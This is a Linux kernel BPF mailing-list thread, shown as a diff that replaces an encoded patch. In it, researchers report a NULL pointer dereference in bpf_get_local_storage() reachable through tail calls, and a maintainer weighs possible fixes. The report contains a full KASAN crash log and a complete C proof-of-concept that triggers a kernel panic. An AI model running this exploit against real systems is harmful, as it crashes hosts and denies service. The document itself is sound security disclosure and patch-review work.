-CQkgKi8NCj4gICAJCW9yYyA9ICZvcmNfZnBfZW50cnk7DQo+ICAgCQlzdGF0ZS0+ZXJyb3Ig
-PSB0cnVlOw0KPiBkaWZmIC0tZ2l0IGEvYXJjaC94ODYvbmV0L2JwZl9qaXRfY29tcC5jIGIv
-YXJjaC94ODYvbmV0L2JwZl9qaXRfY29tcC5jDQo+IGluZGV4IGRlNTA4M2NiMWQzNy4uNTEw
-ZTNlNjJmZDJmIDEwMDY0NA0KPiAtLS0gYS9hcmNoL3g4Ni9uZXQvYnBmX2ppdF9jb21wLmMN
-Cj4gKysrIGIvYXJjaC94ODYvbmV0L2JwZl9qaXRfY29tcC5jDQo+IEBAIC0xNjYxLDYgKzE2
-NjEsOSBAQCBzdGF0aWMgaW50IGRvX2ppdChzdHJ1Y3QgYnBmX3Byb2cgKmJwZl9wcm9nLCBp
-bnQgKmFkZHJzLCB1OCAqaW1hZ2UsIHU4ICpyd19pbWFnZQ0KPiAgIAllbWl0X3Byb2xvZ3Vl
-KCZwcm9nLCBpbWFnZSwgc3RhY2tfZGVwdGgsDQo+ICAgCQkgICAgICBicGZfcHJvZ193YXNf
-Y2xhc3NpYyhicGZfcHJvZyksIHRhaWxfY2FsbF9yZWFjaGFibGUsDQo+ICAgCQkgICAgICBi
-cGZfaXNfc3VicHJvZyhicGZfcHJvZyksIGJwZl9wcm9nLT5hdXgtPmV4Y2VwdGlvbl9jYik7
-DQo+ICsNCj4gKwlicGZfcHJvZy0+YXV4LT5rc3ltLmZwX3N0YXJ0ID0gcHJvZyAtIHRlbXA7
-DQo+ICsNCj4gICAJLyogRXhjZXB0aW9uIGNhbGxiYWNrIHdpbGwgY2xvYmJlciBjYWxsZWUg
-cmVncyBmb3IgaXRzIG93biB1c2UsIGFuZA0KPiAgIAkgKiByZXN0b3JlIHRoZSBvcmlnaW5h
-bCBjYWxsZWUgcmVncyBmcm9tIG1haW4gcHJvZydzIHN0YWNrIGZyYW1lLg0KPiAgIAkgKi8N
-Cj4gQEAgLTI3MTYsNiArMjcxOSw4IEBAIHN0OgkJCWlmIChpc19pbW04KGluc24tPm9mZikp
-DQo+ICAgCQkJCQlwb3BfcjEyKCZwcm9nKTsNCj4gICAJCQl9DQo+ICAgCQkJRU1JVDEoMHhD
-OSk7ICAgICAgICAgLyogbGVhdmUgKi8NCj4gKwkJCWJwZl9wcm9nLT5hdXgtPmtzeW0uZnBf
-ZW5kID0gcHJvZyAtIHRlbXA7DQo+ICsNCj4gICAJCQllbWl0X3JldHVybigmcHJvZywgaW1h
-Z2UgKyBhZGRyc1tpIC0gMV0gKyAocHJvZyAtIHRlbXApKTsNCj4gICAJCQlicmVhazsNCj4g
-ICANCj4gQEAgLTMyOTksNiArMzMwNCw4IEBAIHN0YXRpYyBpbnQgX19hcmNoX3ByZXBhcmVf
-YnBmX3RyYW1wb2xpbmUoc3RydWN0IGJwZl90cmFtcF9pbWFnZSAqaW0sIHZvaWQgKnJ3X2lt
-DQo+ICAgCX0NCj4gICAJRU1JVDEoMHg1NSk7CQkgLyogcHVzaCByYnAgKi8NCj4gICAJRU1J
-VDMoMHg0OCwgMHg4OSwgMHhFNSk7IC8qIG1vdiByYnAsIHJzcCAqLw0KPiArCWltLT5rc3lt
-LmZwX3N0YXJ0ID0gcHJvZyAtICh1OCAqKXJ3X2ltYWdlOw0KPiArDQo+ICAgCWlmICghaXNf
-aW1tOChzdGFja19zaXplKSkgew0KPiAgIAkJLyogc3ViIHJzcCwgc3RhY2tfc2l6ZSAqLw0K
-PiAgIAkJRU1JVDNfb2ZmMzIoMHg0OCwgMHg4MSwgMHhFQywgc3RhY2tfc2l6ZSk7DQo+IEBA
-IC0zNDM2LDcgKzM0NDMsMTAgQEAgc3RhdGljIGludCBfX2FyY2hfcHJlcGFyZV9icGZfdHJh
-bXBvbGluZShzdHJ1Y3QgYnBmX3RyYW1wX2ltYWdlICppbSwgdm9pZCAqcndfaW0NCj4gICAJ
-CWVtaXRfbGR4KCZwcm9nLCBCUEZfRFcsIEJQRl9SRUdfMCwgQlBGX1JFR19GUCwgLTgpOw0K
-PiAgIA0KPiAgIAllbWl0X2xkeCgmcHJvZywgQlBGX0RXLCBCUEZfUkVHXzYsIEJQRl9SRUdf
-RlAsIC1yYnhfb2ZmKTsNCj4gKw0KPiAgIAlFTUlUMSgweEM5KTsgLyogbGVhdmUgKi8NCj4g
-KwlpbS0+a3N5bS5mcF9lbmQgPSBwcm9nIC0gKHU4ICopcndfaW1hZ2U7DQo+ICsNCj4gICAJ
-aWYgKGZsYWdzICYgQlBGX1RSQU1QX0ZfU0tJUF9GUkFNRSkgew0KPiAgIAkJLyogc2tpcCBv
-dXIgcmV0dXJuIGFkZHJlc3MgYW5kIHJldHVybiB0byBwYXJlbnQgKi8NCj4gICAJCUVNSVQ0
-KDB4NDgsIDB4ODMsIDB4QzQsIDgpOyAvKiBhZGQgcnNwLCA4ICovDQo+IGRpZmYgLS1naXQg
-YS9pbmNsdWRlL2xpbnV4L2JwZi5oIGIvaW5jbHVkZS9saW51eC9icGYuaA0KPiBpbmRleCBk
-ODA4MjUzZjJlOTQuLmUzZjU2ZTg0NDNkYSAxMDA2NDQNCj4gLS0tIGEvaW5jbHVkZS9saW51
-eC9icGYuaA0KPiArKysgYi9pbmNsdWRlL2xpbnV4L2JwZi5oDQo+IEBAIC0xMjU3LDYgKzEy
-NTcsOCBAQCBzdHJ1Y3QgYnBmX2tzeW0gew0KPiAgIAlzdHJ1Y3QgbGlzdF9oZWFkCSBsbm9k
-ZTsNCj4gICAJc3RydWN0IGxhdGNoX3RyZWVfbm9kZQkgdG5vZGU7DQo+ICAgCWJvb2wJCQkg
-cHJvZzsNCj4gKwl1MzIJCQkgZnBfc3RhcnQ7DQo+ICsJdTMyCQkJIGZwX2VuZDsNCj4gICB9
-Ow0KPiAgIA0KPiAgIGVudW0gYnBmX3RyYW1wX3Byb2dfdHlwZSB7DQo+IEBAIC0xNDgzLDYg
-KzE0ODUsNyBAQCB2b2lkIGJwZl9pbWFnZV9rc3ltX2FkZChzdHJ1Y3QgYnBmX2tzeW0gKmtz
-eW0pOw0KPiAgIHZvaWQgYnBmX2ltYWdlX2tzeW1fZGVsKHN0cnVjdCBicGZfa3N5bSAqa3N5
-bSk7DQo+ICAgdm9pZCBicGZfa3N5bV9hZGQoc3RydWN0IGJwZl9rc3ltICprc3ltKTsNCj4g
-ICB2b2lkIGJwZl9rc3ltX2RlbChzdHJ1Y3QgYnBmX2tzeW0gKmtzeW0pOw0KPiArYm9vbCBi
-cGZfaGFzX2ZyYW1lX3BvaW50ZXIodW5zaWduZWQgbG9uZyBpcCk7DQo+ICAgaW50IGJwZl9q
-aXRfY2hhcmdlX21vZG1lbSh1MzIgc2l6ZSk7DQo+ICAgdm9pZCBicGZfaml0X3VuY2hhcmdl
-X21vZG1lbSh1MzIgc2l6ZSk7DQo+ICAgYm9vbCBicGZfcHJvZ19oYXNfdHJhbXBvbGluZShj
-b25zdCBzdHJ1Y3QgYnBmX3Byb2cgKnByb2cpOw0KPiBkaWZmIC0tZ2l0IGEva2VybmVsL2Jw
-Zi9jb3JlLmMgYi9rZXJuZWwvYnBmL2NvcmUuYw0KPiBpbmRleCBkNTk1ZmU1MTI0OTguLjdj
-ZDgzODJkMTE1MiAxMDA2NDQNCj4gLS0tIGEva2VybmVsL2JwZi9jb3JlLmMNCj4gKysrIGIv
-a2VybmVsL2JwZi9jb3JlLmMNCj4gQEAgLTc2MCw2ICs3NjAsMjIgQEAgc3RydWN0IGJwZl9w
-cm9nICpicGZfcHJvZ19rc3ltX2ZpbmQodW5zaWduZWQgbG9uZyBhZGRyKQ0KPiAgIAkgICAg
-ICAgTlVMTDsNCj4gICB9DQo+ICAgDQo+ICtib29sIGJwZl9oYXNfZnJhbWVfcG9pbnRlcih1
-bnNpZ25lZCBsb25nIGlwKQ0KPiArew0KPiArCXN0cnVjdCBicGZfa3N5bSAqa3N5bTsNCj4g
-Kwl1bnNpZ25lZCBsb25nIG9mZnNldDsNCj4gKw0KPiArCWd1YXJkKHJjdSkoKTsNCj4gKw0K
-PiArCWtzeW0gPSBicGZfa3N5bV9maW5kKGlwKTsNCj4gKwlpZiAoIWtzeW0gfHwgIWtzeW0t
-PmZwX3N0YXJ0IHx8ICFrc3ltLT5mcF9lbmQpDQo+ICsJCXJldHVybiBmYWxzZTsNCj4gKw0K
-PiArCW9mZnNldCA9IGlwIC0ga3N5bS0+c3RhcnQ7DQo+ICsNCj4gKwlyZXR1cm4gb2Zmc2V0
-ID49IGtzeW0tPmZwX3N0YXJ0ICYmIG9mZnNldCA8IGtzeW0tPmZwX2VuZDsNCj4gK30NCj4g
-Kw0KPiAgIGNvbnN0IHN0cnVjdCBleGNlcHRpb25fdGFibGVfZW50cnkgKnNlYXJjaF9icGZf
-ZXh0YWJsZXModW5zaWduZWQgbG9uZyBhZGRyKQ0KPiAgIHsNCj4gICAJY29uc3Qgc3RydWN0
-IGV4Y2VwdGlvbl90YWJsZV9lbnRyeSAqZSA9IE5VTEw7DQoNCg==
+On Mon, Nov 24, 2025 at 12:47=E2=80=AFPM Amery Hung <ameryhung@gmail.com> w=
+rote:
+>
+> On Mon, Nov 24, 2025 at 1:19=E2=80=AFAM Yinhao Hu <dddddd@hust.edu.cn> wr=
+ote:
+> >
+> > Our fuzzer tool discovered a NULL pointer dereference in the
+> > `bpf_get_local_storage()` helper function. This issue can lead to a
+> > general protection fault when executing specific BPF program sequences
+> > involving tail calls and Cgroup Local Storage. The verification process
+> > for `BPF_MAP_TYPE_PROG_ARRAY` ensures that the Callee is compatible wit=
+h
+> > the map, but it fails to strictly enforce that the Caller has allocated
+> > the necessary Cgroup Storage resources required by the Callee. If a
+> > Caller (which does not use Cgroup Storage) tail calls into a Callee
+> > (which does use `BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE`), the Callee runs
+> > in a context where the storage pointer is `NULL`. The
+> > `bpf_get_local_storage()` helper in the Callee attempts to dereference
+> > this `NULL` storage pointer, causing a crash.
+> >
+> > By manipulating the `BPF_MAP_TYPE_PROG_ARRAY` ownership (assigning it
+> > first to a program that does use storage), we can bypass the initial
+> > compatibility checks and insert a storage-using program into the array,
+> > which can then be invoked by a non-storage-using Caller.
+> >
+> > Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
+> > Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
+> > Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
+> >
+> > ## Reproduction Steps
+> >
+> > 1.  Setup: Create a `BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE` map and a
+> > `BPF_MAP_TYPE_PROG_ARRAY` map.
+> > 2.  Establish Owner: Load a dummy "Owner" program (Prog C) that
+> > references both maps. This sets the `PROG_ARRAY`'s owner attributes to
+> > expect storage usage.
+> > 3.  Load Callee: Load the target program (Prog B) that uses the storage
+> > map and calls `bpf_get_local_storage()`.
+> > 4.  Load Caller: Load the malicious caller program (Prog A) that uses
+> > the `PROG_ARRAY` but not the storage map. The verifier allows this due
+> > to a permissive check on tail call compatibility.
+> > 5.  Update Map: Insert Prog B into the `PROG_ARRAY`.
+> > 6.  Trigger: Execute Prog A via `BPF_PROG_TEST_RUN`. It tail calls into
+> > Prog B, which crashes upon accessing the missing storage.
+> >
+> > ## KASAN Report
+> >
+> > The following C program should demonstrate the vulnerability on
+> > linux-next 6.18.0-rc6-next-20251121:
+>
+> Thanks for reporting. I tested the POC on bpf-next and can still reproduc=
+e.
+>
+> I took a brief look at the cgroup local storage code. The problem
+> seems to be bpf_get_local_storage() not checking if a cgroup local
+> storage is created. A cgroup local storage is created on program
+> attachment (prog A), which never happens. Then a tail call into prog B
+> deference the not-allocated-yet storage.
+>
+> Just thinking out loud. Maybe a if (storage) check before
+> dereferencing would be enough? Also need to look more to see if there
+> are other ways to trigger this type of bug.
+
+Looking at the problem a bit more. Here are several solutions that I
+can think of.
+
+(1) Adding a "if (!storage) return NULL;" check.
+CONS: It will change the helper from RET_PTR_TO_MAP_VALUE to
+RET_PTR_TO_MAP_VALUE_OR_NULL, which will break UAPI.
+
+(2) Adding a runtime check to disallow tail calls from a program that
+does not use cgroup local storage to a program that does.
+CONS: Add overhead to all tail calls.
+
+(3) Allocating and linking cgroup local storage when updating
+prog_array map if the program is using one.
+Probably the most reasonable fix among the three.
+
+>
+> >
+> > ```
+> > [   87.795255] Oops: general protection fault, probably for
+> > non-canonical address 0xdffffc0000000000: 0000 [#1] SMP KASAN NOPTI
+> > [   87.796199] KASAN: null-ptr-deref in range
+> > [0x0000000000000000-0x0000000000000007]
+> > [   87.796952] CPU: 0 UID: 0 PID: 350 Comm: poc Not tainted
+> > 6.18.0-rc6-next-20251121 #9 PREEMPT(none)
+> > [   87.797863] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX,
+> > 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+> > [   87.798828] RIP: 0010:bpf_get_local_storage+0x106/0x1c0
+> > [   87.799403] Code: 48 8d 7b 10 48 89 fa 48 c1 ea 03 80 3c 02 00 0f 85
+> > 9d 00 00 00 48 b8 00 00 00 00 00 fc ff df 48 8b 5b 10 48 89 da 48 c1 ea
+> > 03 <80> 3c 02 00 0f 85 88 00 00 00 48 8b 1b e8 58 8c b5 03 89 c5 3d ff
+> > [   87.801321] RSP: 0018:ffff8881042675b8 EFLAGS: 00010256
+> > [   87.801860] RAX: dffffc0000000000 RBX: 0000000000000000 RCX:
+> > 1ffffffff1359c34
+> > [   87.802583] RDX: 0000000000000000 RSI: 0000000000000000 RDI:
+> > ffff888104267700
+> > [   87.803356] RBP: 0000000000000015 R08: 0000000000000001 R09:
+> > 0000000000000000
+> > [   87.804074] R10: ffff888113aaf000 R11: ffff888113aaf0bc R12:
+> > ffff888104267930
+> > [   87.804816] R13: ffffc900005c7000 R14: ffff888104267730 R15:
+> > ffffed10227ea641
+> > [   87.805563] FS:  0000000029cbc380(0000) GS:ffff8881911ff000(0000)
+> > knlGS:0000000000000000
+> > [   87.806467] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+> > [   87.807080] CR2: 00000000004a0000 CR3: 000000010317f000 CR4:
+> > 0000000000750ef0
+> > [   87.807852] PKRU: 55555554
+> > [   87.808150] Call Trace:
+> > [   87.808447]  <TASK>
+> > [   87.808703]  bpf_prog_09b98cd0bcd009a1+0x1d/0x28
+> > [   87.809209]  bpf_test_run+0x47b/0xcd0
+> > [   87.809620]  ? __pfx_bpf_test_run+0x10/0x10
+> > [   87.810086]  ? check_bytes_and_report+0xd0/0x150
+> > [   87.811109]  ? __asan_memset+0x1f/0x40
+> > [   87.811544]  bpf_prog_test_run_skb+0xea9/0x3570
+> > [   87.812059]  ? __pfx_bpf_prog_test_run_skb+0x10/0x10
+> > [   87.813150]  ? __pfx_bpf_check_uarg_tail_zero+0x10/0x10
+> > [   87.813733]  __sys_bpf+0xac0/0x5110
+> > [   87.814123]  ? __pfx___sys_bpf+0x10/0x10
+> > [   87.815056]  ? kfree+0x19b/0x510
+> > [   87.815931]  ? __sys_bpf+0x2ca1/0x5110
+> > [   87.816906]  ? __sys_bpf+0x1b2f/0x5110
+> > [   87.817316]  ? __pfx___sys_bpf+0x10/0x10
+> > [   87.818752]  __x64_sys_bpf+0x74/0xc0
+> > [   87.819134]  do_syscall_64+0x76/0x4e0
+> > [   87.820630]  ? do_syscall_64+0xa2/0x4e0
+> > [   87.821606]  ? do_syscall_64+0x24c/0x4e0
+> > [   87.822558]  ? switch_fpu_return+0xf6/0x200
+> > [   87.823570]  ? do_syscall_64+0x24c/0x4e0
+> > [   87.824039]  ? handle_mm_fault+0x1ab/0x900
+> > [   87.824518]  ? lock_mm_and_find_vma+0x58/0x720
+> > [   87.825562]  ? do_user_addr_fault+0x863/0xf40
+> > [   87.826595]  ? irqentry_exit+0x54/0x6a0
+> > [   87.827025]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
+> > [   87.827716] RIP: 0033:0x41233d
+> > [   87.828074] Code: b3 66 2e 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa
+> > 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f
+> > 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
+> > [   87.830029] RSP: 002b:00007fffbf5d6be8 EFLAGS: 00000206 ORIG_RAX:
+> > 0000000000000141
+> > [   87.830840] RAX: ffffffffffffffda RBX: 0000000000000001 RCX:
+> > 000000000041233d
+> > [   87.831604] RDX: 0000000000000090 RSI: 00007fffbf5d6cd0 RDI:
+> > 000000000000000a
+> > [   87.832367] RBP: 00007fffbf5d6c00 R08: 00007fffbf5d6cd0 R09:
+> > 00007fffbf5d6cd0
+> > [   87.833149] R10: 00007fffbf5d6cd0 R11: 0000000000000206 R12:
+> > 00007fffbf5d7f08
+> > [   87.833975] R13: 00007fffbf5d7f18 R14: 00000000004a5f68 R15:
+> > 0000000000000001
+> > [   87.834744]  </TASK>
+> > [   87.835012] Modules linked in:
+> > [   87.835450] ---[ end trace 0000000000000000 ]---
+> > [   87.835917] RIP: 0010:bpf_get_local_storage+0x106/0x1c0
+> > [   87.836462] Code: 48 8d 7b 10 48 89 fa 48 c1 ea 03 80 3c 02 00 0f 85
+> > 9d 00 00 00 48 b8 00 00 00 00 00 fc ff df 48 8b 5b 10 48 89 da 48 c1 ea
+> > 03 <80> 3c 02 00 0f 85 88 00 00 00 48 8b 1b e8 58 8c b5 03 89 c5 3d ff
+> > [   87.838321] RSP: 0018:ffff8881042675b8 EFLAGS: 00010256
+> > [   87.838884] RAX: dffffc0000000000 RBX: 0000000000000000 RCX:
+> > 1ffffffff1359c34
+> > [   87.839671] RDX: 0000000000000000 RSI: 0000000000000000 RDI:
+> > ffff888104267700
+> > [   87.840415] RBP: 0000000000000015 R08: 0000000000000001 R09:
+> > 0000000000000000
+> > [   87.841143] R10: ffff888113aaf000 R11: ffff888113aaf0bc R12:
+> > ffff888104267930
+> > [   87.841934] R13: ffffc900005c7000 R14: ffff888104267730 R15:
+> > ffffed10227ea641
+> > [   87.842713] FS:  0000000029cbc380(0000) GS:ffff8881911ff000(0000)
+> > knlGS:0000000000000000
+> > [   87.843547] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+> > [   87.844138] CR2: 00000000004a0000 CR3: 000000010317f000 CR4:
+> > 0000000000750ef0
+> > [   87.844877] PKRU: 55555554
+> > [   87.845181] Kernel panic - not syncing: Fatal exception in interrupt
+> > [   87.845984] Kernel Offset: disabled
+> > [   87.846339] ---[ end Kernel panic - not syncing: Fatal exception in
+> > interrupt ]---
+> > ```
+> >
+> > ## Proof of Concept
+> >
+> > ```c
+> > #define _GNU_SOURCE
+> > #include <stdio.h>
+> > #include <unistd.h>
+> > #include <sys/syscall.h>
+> > #include <linux/bpf.h>
+> > #include <string.h>
+> > #include <errno.h>
+> >
+> > #ifndef __NR_bpf
+> > #define __NR_bpf 321
+> > #endif
+> >
+> > #define BPF_MOV64_IMM(DST, IMM) \
+> >         ((struct bpf_insn){.code =3D BPF_ALU64 | BPF_MOV | BPF_K, .dst_=
+reg =3D DST,
+> > .imm =3D IMM})
+> >
+> > #define BPF_LD_MAP_FD(DST, MAP_FD) \
+> >         ((struct bpf_insn){.code =3D BPF_LD | BPF_DW | BPF_IMM, .dst_re=
+g =3D DST,
+> > .src_reg =3D BPF_PSEUDO_MAP_FD, .imm =3D MAP_FD}), \
+> >         ((struct bpf_insn){.code =3D 0, .imm =3D 0})
+> >
+> > #define BPF_CALL_FUNC(FUNC) \
+> >         ((struct bpf_insn){.code =3D BPF_JMP | BPF_CALL, .imm =3D FUNC}=
+)
+> >
+> > #define BPF_EXIT_INSN() \
+> >         ((struct bpf_insn){.code =3D BPF_JMP | BPF_EXIT})
+> >
+> > static inline int sys_bpf(enum bpf_cmd cmd, union bpf_attr *attr,
+> > unsigned int size) {
+> >         return syscall(__NR_bpf, cmd, attr, size);
+> > }
+> >
+> > int main(void) {
+> >         union bpf_attr attr =3D {};
+> >         char log_buf[4096];
+> >         int storage_map, prog_array, prog_a, prog_b, prog_c;
+> >
+> >         // 1.1 Create Per-CPU Cgroup Storage Map
+> >         struct { __u64 cgroup_inode_id; __u32 attach_type; } key =3D {}=
+;
+> >         attr.map_type =3D BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE;
+> >         attr.key_size =3D sizeof(key);
+> >         attr.value_size =3D 8;
+> >         storage_map =3D sys_bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
+> >         if (storage_map < 0) return 1;
+> >
+> >         // 1.2 Create Prog Array
+> >         memset(&attr, 0, sizeof(attr));
+> >         attr.map_type =3D BPF_MAP_TYPE_PROG_ARRAY;
+> >         attr.key_size =3D 4;
+> >         attr.value_size =3D 4;
+> >         attr.max_entries =3D 1;
+> >         prog_array =3D sys_bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
+> >         if (prog_array < 0) return 1;
+> >
+> >         // 2. Load Prog C (Dummy Owner)
+> >         struct bpf_insn insns_c[] =3D {
+> >                 BPF_LD_MAP_FD(BPF_REG_1, storage_map),
+> >                 BPF_LD_MAP_FD(BPF_REG_2, prog_array),
+> >                 BPF_MOV64_IMM(BPF_REG_0, 1),
+> >                 BPF_EXIT_INSN(),
+> >         };
+> >         memset(&attr, 0, sizeof(attr));
+> >         attr.prog_type =3D BPF_PROG_TYPE_CGROUP_SKB;
+> >         attr.insns =3D (unsigned long)insns_c;
+> >         attr.insn_cnt =3D sizeof(insns_c) / sizeof(struct bpf_insn);
+> >         attr.license =3D (unsigned long)"GPL";
+> >         prog_c =3D sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
+> >         if (prog_c < 0) return 1;
+> >
+> >         // 3. Load Prog B (Callee)
+> >         struct bpf_insn insns_b[] =3D {
+> >                 BPF_LD_MAP_FD(BPF_REG_1, storage_map),
+> >                 BPF_MOV64_IMM(BPF_REG_2, 0),
+> >                 BPF_CALL_FUNC(BPF_FUNC_get_local_storage),
+> >                 BPF_MOV64_IMM(BPF_REG_0, 1),
+> >                 BPF_EXIT_INSN(),
+> >         };
+> >         attr.insns =3D (unsigned long)insns_b;
+> >         attr.insn_cnt =3D sizeof(insns_b) / sizeof(struct bpf_insn);
+> >         attr.log_buf =3D (unsigned long)log_buf;
+> >         attr.log_size =3D sizeof(log_buf);
+> >         attr.log_level =3D 1;
+> >         prog_b =3D sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
+> >         if (prog_b < 0) return 1;
+> >
+> >         // 4. Load Prog A (Caller)
+> >         struct bpf_insn insns_a[] =3D {
+> >                 BPF_LD_MAP_FD(BPF_REG_2, prog_array),
+> >                 BPF_MOV64_IMM(BPF_REG_3, 0),
+> >                 BPF_CALL_FUNC(BPF_FUNC_tail_call),
+> >                 BPF_MOV64_IMM(BPF_REG_0, 1),
+> >                 BPF_EXIT_INSN(),
+> >         };
+> >         attr.insns =3D (unsigned long)insns_a;
+> >         attr.insn_cnt =3D sizeof(insns_a) / sizeof(struct bpf_insn);
+> >         prog_a =3D sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
+> >         if (prog_a < 0) return 1;
+> >
+> >         // 5. Update Prog Array
+> >         int key_0 =3D 0;
+> >         memset(&attr, 0, sizeof(attr));
+> >         attr.map_fd =3D prog_array;
+> >         attr.key =3D (unsigned long)&key_0;
+> >         attr.value =3D (unsigned long)&prog_b;
+> >         if (sys_bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr)) < 0) retu=
+rn 1;
+> >
+> >         // 6. Run Program A
+> >         char data[128] =3D {};
+> >         memset(&attr, 0, sizeof(attr));
+> >         attr.test.prog_fd =3D prog_a;
+> >         attr.test.data_in =3D (unsigned long)data;
+> >         attr.test.data_size_in =3D sizeof(data);
+> >         attr.test.repeat =3D 1;
+> >         sys_bpf(BPF_PROG_TEST_RUN, &attr, sizeof(attr));
+> >
+> >         return 0;
+> > }
+> > ```
 
